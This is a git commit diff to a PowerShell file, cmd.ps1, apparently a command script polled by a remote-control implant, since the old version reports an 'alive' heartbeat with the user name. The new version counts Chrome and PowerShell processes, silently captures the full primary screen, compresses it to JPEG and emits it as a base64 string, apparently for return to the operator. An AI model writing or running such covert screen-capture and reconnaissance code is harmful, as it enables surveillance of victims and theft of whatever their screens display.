38633365b2eed167d0aad20e6a79de8be9dcb9cb
bloxvm4826 <filthysignal546@mail.bu.app>
2026-07-28 13:00:42 -0400

    u

--- cmd.ps1
+++ cmd.ps1
@@ -1,2 +1,16 @@
-'TAG:T1785258029'
-"alive: "+(Get-Date -F HH:mm:ss)+" user="+$env:USERNAME
+'TAG:T1785258041'
+"procs: "+((Get-Process chrome -EA 0).Count)+" auto="+((Get-Process powershell,pwsh -EA 0|Measure).Count)
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
+$g=[Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
+$sm=New-Object Drawing.Bitmap 1280,720
+$g2=[Drawing.Graphics]::FromImage($sm)
+$g2.DrawImage($bmp,0,0,1280,720)
+$ms=New-Object IO.MemoryStream
+$enc=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object {$_.MimeType -eq 'image/jpeg'}
+$p=New-Object Drawing.Imaging.EncoderParameters 1
+$p.Param[0]=New-Object Drawing.Imaging.EncoderParameter ([Drawing.Imaging.Encoder]::Quality),50
+$sm.Save($ms,$enc,$p)
+"B64:"+[Convert]::ToBase64String($ms.ToArray())
